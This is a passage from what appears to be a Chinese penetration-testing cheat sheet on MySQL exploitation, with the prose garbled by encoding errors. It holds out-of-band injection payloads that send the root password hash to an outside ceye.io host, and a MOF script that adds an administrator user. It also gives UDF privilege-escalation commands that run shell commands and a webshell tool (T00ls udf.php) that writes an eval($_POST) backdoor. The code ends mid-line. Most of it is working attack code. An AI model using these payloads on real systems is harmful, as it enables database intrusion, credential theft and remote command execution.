<h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><p>æœ‰æ—¶å€™æ³¨å…¥å‘ç°å¹¶æ²¡æœ‰å›æ˜¾ï¼Œä¹Ÿä¸èƒ½åˆ©ç”¨æ—¶é—´ç›²æ³¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨å¸¦å¤–é€šé“ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨å…¶ä»–åè®®æˆ–è€…æ¸ é“ï¼Œå¦‚httpè¯·æ±‚ã€DNSè§£æã€SMBæœåŠ¡ç­‰å°†æ•°æ®å¸¦å‡ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,( SELECT DATABASE() ),&#39;.xx.xx\\x));</span><br><span class="line"></span><br><span class="line"># ceye</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user&#x3D;&#39;root&#39; LIMIT 1),&#39;.xxx.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure>

<p><strong>æ¡ä»¶ï¼š</strong></p>
<ul>
<li>mysql.ini ä¸­ secure_file_priv å¿…é¡»ä¸ºç©º</li>
</ul>
<p>mysql æ–°ç‰ˆæœ¬ä¸‹secure-file-privå­—æ®µ ï¼š secure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å½“secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</span><br><span class="line"></span><br><span class="line">å½“secure_file_privçš„å€¼ä¸º&#x2F;tmp&#x2F; ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹</span><br><span class="line"></span><br><span class="line">å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</span><br></pre></td></tr></table></figure>

<ul>
<li>ä»payloadçœ‹å‡ºload_fileçš„è·¯å¾„æ˜¯windowsä¸‹çš„UNCè·¯å¾„ï¼Œæ‰€ä»¥mysqlå¸¦å¤–æ³¨å…¥åªèƒ½å‘ç”Ÿåœ¨windowsæœºå™¨ä¸Š</li>
</ul>
<h1 id="MySQLææƒ"><a href="#MySQLææƒ" class="headerlink" title="MySQLææƒ"></a>MySQLææƒ</h1><h2 id="SQLMap-MSF"><a href="#SQLMap-MSF" class="headerlink" title="SQLMap+MSF"></a>SQLMap+MSF</h2><p>å·²çŸ¥ç”¨æˆ·åå¯†ç æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Sqlmapç»“åˆMSFè¿›è¡Œææƒã€‚(éœ€è¦å¯¹ç›®å½•æœ‰å†™æƒé™)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -d mysql:&#x2F;&#x2F;admin:123456@10.52.95.209:3306&#x2F;mysql --os-pwn --msf-path &#x2F;opt&#x2F;metasploit-framework&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h2><p><strong>ç®€ä»‹ï¼š</strong>mofæ˜¯windowsç³»ç»Ÿçš„ä¸€ä¸ªæ–‡ä»¶ï¼ˆåœ¨c:/windows/system32/wbem/mof/nullevt.mofï¼‰å«åšâ€æ‰˜ç®¡å¯¹è±¡æ ¼å¼â€å…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚å…¶å°±æ˜¯ç”¨åˆäº†mysqlçš„rootæƒé™äº†ä»¥åï¼Œç„¶åä½¿ç”¨rootæƒé™å»æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„mofã€‚éš”äº†ä¸€å®šæ—¶é—´ä»¥åè¿™ä¸ªmofå°±ä¼šè¢«æ‰§è¡Œï¼Œè¿™ä¸ªmofå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œè¿™ä¸ªvbså¤§å¤šæ•°çš„æ˜¯cmdçš„æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„å‘½ä»¤ã€‚</p>
<p><strong>å¿…å¤‡å‘½ä»¤</strong></p>
<p>æ‰€éœ€è¦çš„SQLè¯­å¥<code>select load_file(&#39;D:\wamp\xishaonian.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;</code></p>
<p><strong>å¿…å¤‡è„šæœ¬</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> # pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line"> EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line"> Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line"> Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">         &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">         &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line"> QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line"> Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line"> ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line"> ScriptText &#x3D; </span><br><span class="line"> &quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line"> Consumer   &#x3D; $Consumer; </span><br><span class="line"> Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h2><p>è¿™é‡Œçš„å‰ææ˜¯å·²ç»ä¸Šä¼ äº†udf.dll,å¦‚æœæ²¡æœ‰å†™å…¥æƒé™ï¼Œemmm,,,æˆ‘ä¸è‚¥äº†ã€‚ã€‚</p>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li><p>mysql&lt;5.2ç‰ˆæœ¬çš„å°†.dllæ–‡ä»¶å¯¼å…¥åˆ°c:\windows æˆ–è€…c:\windows\system32 ç›®å½•ä¸‹ã€‚</p>
</li>
<li><p>mysql&gt;5.2ç‰ˆæœ¬çš„å°†.dllæ–‡ä»¶å¯¼å…¥åˆ°/MySQL/lib/plugin/ mysqlå®‰è£…ç›®å½•ä¸‹ã€‚</p>
</li>
<li><p>å¦‚æœæŠ¥é”™å†…å®¹ä¸ºï¼š<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statemen</code>è¯·åœ¨MySQLé…ç½®æ–‡ä»¶<code>my.ini</code>æ–‡ä»¶çš„<code>[mysqld]</code>é€‰é¡¹å†…åŠ å…¥<code>secure_file_priv =</code>ç„¶åé‡å¯mysqlæœåŠ¡ã€‚ã€‚</p>
</li>
<li><p>å¦‚æœæŠ¥é”™<code>--secure-file-priv</code> åˆæ— æ³•ä¿®æ”¹<code>my.ini</code>ï¼Œåˆ™æ²¡æœ‰åŠæ³•ã€‚</p>
</li>
</ul>
<p>è¯¦æƒ…å‚è€ƒï¼š<a href="https://segmentfault.com/a/1190000009333563"><code>--secure-file-priv ç‰¹æ€§</code></a></p>
<h3 id="æ‰‹åŠ¨UDFææƒ"><a href="#æ‰‹åŠ¨UDFææƒ" class="headerlink" title="æ‰‹åŠ¨UDFææƒ"></a>æ‰‹åŠ¨UDFææƒ</h3><h4 id="åˆ¶ä½œudf-dll"><a href="#åˆ¶ä½œudf-dll" class="headerlink" title="åˆ¶ä½œudf.dll"></a>åˆ¶ä½œudf.dll</h4><p>SQLMAPä¸‹è·¯å¾„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/usr/local/Cellar/sqlmap/<span class="number">1.4</span><span class="number">.3</span>/libexec/data/udf/mysql/windows/<span class="number">64</span></span><br><span class="line">/usr/local/Cellar/sqlmap/<span class="number">1.4</span><span class="number">.3</span>/libexec/extra/cloak</span><br><span class="line"></span><br><span class="line">python2 cloak.py -d -i lib_mysqludf_sys.dll_</span><br><span class="line"><span class="comment"># å³å¯åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ  lib_mysqludf_sys.dll</span></span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨ 1"></a>åˆ©ç”¨ 1</h4><ul>
<li>æŸ¥çœ‹pluginç›®å½•<code>show variables like &#39;%plugin%&#39;;</code></li>
</ul>
<p>æç¤ºï¼šç”±äºMySQL&gt;5.2ç‰ˆæœ¬åï¼Œåœ¨å…¶å®‰è£…ç›®å½•çš„libç›®å½•ä¸‹æ²¡æœ‰ plugin ç›®å½•ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¾—æ–°å»ºè¿™ä¸ªç›®å½•ï¼Œå¹¶ä¸”å°†æˆ‘ä»¬çš„ udf.dll æ–‡ä»¶æ”¾å…¥ pluginç›®å½•ä¸‹ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œä½¿ç”¨NTFS ADSæµåˆ›å»º plugin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;xxxxxx&#39; into dumpfile &#39;C:\\Program\ Files\\MySQL\\MySQL\ Server\ 5.4\\lib\\plugin::$INDEX_ALLOCATION&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>å¯¼å‡ºUDF(ä¹Ÿå³æ˜¯å°†ä¹‹å‰ç”Ÿæˆçš„lib_mysqludf_sys.dllä¸Šä¼ åˆ°ç›®æ ‡æ–‡ä»¶å¤¹)</p>
</li>
<li><p>åˆ›å»ºå‡½æ•°ï¼š<code>CREATE FUNCTION shell RETURNS STRING SONAME &#39;lib_mysqludf_sys.dll&#39;</code></p>
</li>
</ul>
<p>æ³¨æ„ï¼šå¦‚æœåˆ›å»ºå‡½æ•°æ—¶æŠ¥é”™ï¼Œè¯·æ ¹æ®<code>lib_mysqludf_sys.dll</code>ä¸­çš„å‡½æ•°åˆ›å»ºã€‚</p>
<h4 id="åˆ©ç”¨2"><a href="#åˆ©ç”¨2" class="headerlink" title="åˆ©ç”¨2"></a>åˆ©ç”¨2</h4><p>åˆ©ç”¨äº¤äº’å¼çš„SHELLï¼Œmysql -uroot -pxxxæ— æ³•ç»§ç»­äº¤äº’ï¼Œéœ€è¦å‚æ•°eè§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into a (cmd) values</span><br><span class="line">(hex(load_file(&#39;C:\\xxxx\\xxxx.dll&#39;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM a INTO DUMPFILE &#39;c:\\windows\\system32\\xxxx.dll&#39;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&#39;cmd&#39;,&#39;C:\\xxxx\\xxx\\xxxxx.exe&#39;);&quot;</span><br></pre></td></tr></table></figure>

<p>å¦‚æ²¡æœ‰æŒ‡å®šdatabaseï¼Œå°†ä¼šå‡ºç°é”™è¯¯ï¼Œè€Œä½¿ç”¨UNIONï¼Œå°†ä¸ä¼šæœ‰å›æ˜¾ï¼Œä¸€å®šå‡ºç°é—®<br>é¢˜ï¼Œå°†ä¼šå¾ˆéš¾å®šä½ï¼Œæ•…é€‰æ‹©ä»¥mysql.xçš„æ–¹å¼æŒ‡å®šã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pXXXXXX -e &quot;create table mysql.a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;insert into mysql.a (cmd) values</span><br><span class="line">(hex(load_file(&#x27;D:\\XXXXXXXXXX\\mysql5\\lib\\plugin\\u.dll&#x27;)));&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;SELECT unhex(cmd) FROM mysql.a INTO DUMPFILE</span><br><span class="line">&#x27;D:/XXXXXXXXXX/mysql5/lib/plugin/uu.dll&#x27;;&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#x27;uu.dll&#x27;&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;select shell(&#x27;cmd&#x27;,&#x27;whoami&#x27;);&quot; </span><br></pre></td></tr></table></figure>

<h3 id="UDFææƒå¤§é©¬"><a href="#UDFææƒå¤§é©¬" class="headerlink" title="UDFææƒå¤§é©¬"></a>UDFææƒå¤§é©¬</h3><p>å¯ä»¥ä½¿ç”¨<code>T00ls udf.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//t00ls...................</span></span><br><span class="line">session_start();<span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;T00ls UDF.PHP&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">input&#123;font:<span class="number">12</span>px Arial,Tahoma;background:<span class="comment">#fff;border: 1px solid #666;padding:2px;height:22px;&#125;</span></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	document.getElementById(<span class="string">&quot;sql2&quot;</span>).value= unescape(<span class="string">&quot;select%20%27%3C%3Fphp%20eval%28%24_POST%5B%5C%27pass%5C%27%5D%29%3F%3E%27%20into%20outfile%20%27d%3A%5C%5Cninty.php%27&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	document.getElementById(<span class="string">&quot;sql2&quot;</span>).value = unescape(<span class="string">&quot;select%20load_file%28%27c%3A%5C%5Cboot.ini%27%29&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line">	$action = $_REQUEST[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	$action = <span class="string">&#x27;vConn&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;vConn&#x27;</span>:</span><br><span class="line">		vConn();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;conn&#x27;</span>:</span><br><span class="line">		conn();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;exec&#x27;</span>:</span><br><span class="line">		execsql();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;install&#x27;</span>:</span><br><span class="line">		install();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;copy&#x27;</span>:</span><br><span class="line">		cp();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;cplug&#x27;</span>:</span><br><span class="line">		cplug();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line">		logout();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;func&#x27;</span>:</span><br><span class="line">		func();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">vConn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;by ninty http://www.t00ls.net/&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;table&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;conn&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;&lt;td&gt;ip:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;host&quot; value=&quot;localhost&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;uid:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; value=&quot;root&quot; name=&quot;uid&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;pwd:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;db:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;db&quot; value=&quot;mysql&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=&quot;submit&quot;/&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	mysql_select_db(<span class="string">&#x27;mysql&#x27;</span>,$conn);</span><br><span class="line">	mysql_query(<span class="string">&#x27;CREATE TABLE `func` ( `name` char(64) collate utf8_bin NOT NULL default \&#x27;\&#x27;, `ret` tinyint(1) NOT NULL default \&#x27;0\&#x27;, `dl` char(128) collate utf8_bin NOT NULL default \&#x27;\&#x27;, `type` enum(\&#x27;function\&#x27;,\&#x27;aggregate\&#x27;) character set utf8 NOT NULL, PRIMARY KEY (`name`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\&#x27;User defined functions\&#x27;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error() . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Create mysql.func success !&#x27;</span>;</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">conn</span>(<span class="params">$close = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">		$host = $_SESSION[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">		$uid = $_SESSION[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">		$pwd = $_SESSION[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">		$db = $_SESSION[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$host = $_POST[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">		$uid = $_POST[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">		$pwd = $_POST[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">		$db = $_POST[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	$conn = mysql_connect($host,$uid,$pwd);</span><br><span class="line">	<span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		vConn();</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125; </span><br><span class="line">	mysql_select_db($db,$conn);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		vConn();</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;host&#x27;</span>] = $host;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;uid&#x27;</span>] = $uid;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;pwd&#x27;</span>] = $pwd;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;db&#x27;</span>] = $db;</span><br><span class="line">	<span class="comment">//mysql_query(&#x27;set names utf8&#x27;);</span></span><br><span class="line">	showM($conn,$close);</span><br><span class="line">	<span class="keyword">return</span> $conn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;uid&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;pwd&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;db&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;over51&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;plugindir&#x27;</span>]);</span><br><span class="line">	$url = $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]; </span><br><span class="line">	$filename = end(explode(<span class="string">&#x27;/&#x27;</span>,$url));  </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href = &quot;&#x27;</span>.$filename.<span class="string">&#x27;?rn=&quot;+Math.random()&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showM</span>(<span class="params">&amp;$conn,$close = <span class="literal">true</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;b&gt;t00ls UDF.PHP&lt;/b&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;logout&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Logout&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&#x27;</span>;</span><br><span class="line">	$sql = <span class="string">&#x27;select concat(\&#x27;&lt;b&gt;user()&lt;/b&gt;:\&#x27;,user()) as m union select concat(\&#x27;&lt;b&gt;database():&lt;/b&gt;\&#x27;,database()) union select concat(\&#x27;&lt;b&gt;datadir&lt;/b&gt;:\&#x27;,@@datadir) union select concat(\&#x27;&lt;b&gt;basedir&lt;/b&gt;:\&#x27;,@@basedir) union select concat(\&#x27;&lt;b&gt;version()&lt;/b&gt;:\&#x27;,version()) ;&#x27;</span>;</span><br><span class="line">	$meta = mysql_query($sql,$conn);</span><br><span class="line">	$tmp = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> ($row = mysql_fetch_array($meta,MYSQL_ASSOC)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $row[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span> ($tmp == <span class="number">1</span>) &#123;</span><br><span class="line">			$tmp = <span class="number">2</span>;</span><br><span class="line">			$h = substr($row[<span class="string">&#x27;m&#x27;</span>],strpos($row[<span class="string">&#x27;m&#x27;</span>],<span class="string">&#x27;@&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> ($h != <span class="string">&#x27;localhost&#x27;</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27; &lt;b&gt;&lt;i&gt;&lt;font color=green&gt;[web and db is not the same server.]&lt;/font&gt;&lt;/i&gt;&lt;/b&gt;&#x27;</span>;</span><br><span class="line">			$_SESSION[<span class="string">&#x27;notsame&#x27;</span>] = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;plugin_dir&lt;/b&gt;:&#x27;</span>;</span><br><span class="line">	$meta = mysql_query(<span class="string">&#x27;show variables like &quot;plugin_dir&quot;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_num_rows($meta)==<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color=white&gt;mysql is under 5.1 , &#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>]))</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27; u can dump udf.dll to any directory in follow paths&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//over 5.1</span></span><br><span class="line">		$_SESSION[<span class="string">&#x27;over51&#x27;</span>] = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">		$row = mysql_fetch_row($meta);</span><br><span class="line">		$_SESSION[<span class="string">&#x27;plugindir&#x27;</span>] = str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>])).<span class="string">&#x27;\\\\udf.dll&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color=white&gt;&#x27;</span>.str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>]).<span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; (mysql over 5.1, udf.dll can only dump to plugin_dir) &#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>])) </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27; &lt;font&gt;&lt;b&gt;&lt;i&gt;[maybe dump dll will be failed!]&lt;/i&gt;&lt;/b&gt;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (!file_exists(str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>]))) </span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27; &lt;a href=&quot;?action=cplug&amp;dir=&#x27;</span>.base64_encode(str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>])).<span class="string">&#x27;&quot;&gt;Create PluginDir&lt;/a&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27; exists!&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span 